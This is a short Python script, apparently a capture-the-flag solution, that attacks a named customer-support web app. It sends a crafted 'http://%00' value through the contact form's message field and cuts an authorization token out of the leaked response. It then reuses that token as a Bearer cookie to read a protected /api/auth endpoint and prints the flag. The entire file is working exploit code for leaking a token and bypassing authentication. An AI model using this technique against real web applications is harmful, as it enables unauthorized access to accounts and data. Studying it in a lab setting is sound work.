import requests

url = "https://customer-support-p558t.ondigitalocean.app"

payload = "http://%00"
json = {
    "name":"name-kz",
    "email":"test@kz.pl",
    "subject":"subject-kz",
    "message":payload
}

response = requests.post(url= url + "/api/contact", json= json)

# cut only token from the response
token = response.text[49:-9]
print(token, "- token")
cookie = {"Authorization":" Bearer " + token}

resposne2 = requests.get(url= url + "/api/auth", cookies=cookie)
flag = resposne2.text[28:-2]

print(flag, "- flag")